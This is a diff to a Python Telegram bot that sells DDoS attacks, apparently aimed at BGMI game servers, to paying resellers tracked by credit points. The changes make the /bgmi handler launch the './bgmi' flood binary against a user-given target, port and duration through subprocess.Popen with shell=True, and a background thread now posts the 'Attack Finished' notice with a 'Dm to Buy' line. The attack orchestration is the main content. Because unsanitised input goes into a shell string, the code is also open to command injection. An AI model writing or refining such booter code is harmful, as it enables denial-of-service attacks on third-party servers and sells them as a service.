@@ -44,7 +44,7 @@ def read_admins(bot_id):
     return [admin[0] for admin in admins]
 
 def get_credit_points(user_id):
-    conn = get_connection()
+    conn = db_connection()
     cursor = conn.cursor()
     cursor.execute('SELECT credit_points FROM resellers WHERE user_id = ?', (user_id,))
     result = cursor.fetchone()
@@ -52,7 +52,7 @@ def get_credit_points(user_id):
     return result[0] if result else None
 
 def update_credit_points(user_id, points):
-    conn = get_connection()
+    conn = db_connection()
     cursor = conn.cursor()
     cursor.execute('UPDATE resellers SET credit_points = credit_points - ? WHERE user_id = ?', (points, user_id))
     conn.commit()
@@ -434,12 +434,27 @@ def initialize_bot(bot, bot_id):
                     log_command(user_id, target, port, time, '/bgmi')
                     start_attack_reply(message, target, port, time)  
                     full_command = f"./bgmi {target} {port} {time} 900"
-                    subprocess.run(full_command, shell=True)
-                    response = f"☣️BGMI D-DoS Attack Finished.\n\nTarget: {target} Port: {port} Time: {time} Seconds\n\n👛Dm to Buy : {owner_name}"
+                    # subprocess.run(full_command, shell=True)
+                    # response = f"☣️BGMI D-DoS Attack Finished.\n\nTarget: {target} Port: {port} Time: {time} Seconds\n\n👛Dm to Buy : {owner_name}"
+            # else:
+                # response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
+        # else:
+            # response = f"You Are Not Authorized To Use This Command.\n\nKindly Contact Admin to purchase the Access : {owner_name}."
+        # bot.reply_to(message, response)
+                    subprocess.Popen(full_command, shell=True)
+                    scheduled_time = datetime.now() + timedelta(seconds=attack_time)
+                    threading.Thread(target=finish_message, args=(message, target, port, attack_time, owner_name, scheduled_time)).start()
             else:
-                response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
+                response = "✅ Usage :- /bgmi <target> <port> <time>"
         else:
             response = f"You Are Not Authorized To Use This Command.\n\nKindly Contact Admin to purchase the Access : {owner_name}."
+        bot.reply_to(message, response)
+
+    def finish_message(message, target, port, attack_time, owner_name, scheduled_time):
+        while datetime.now() < scheduled_time:
+            t.sleep(1)
+        
+        response = f"☣️BGMI D-DoS Attack Finished.\n\nTarget: {target} Port: {port} Time: {attack_time} Seconds\n\n👛Dm to Buy : {owner_name}"
         bot.reply_to(message, response)
     
     @bot.message_handler(commands=['help'])
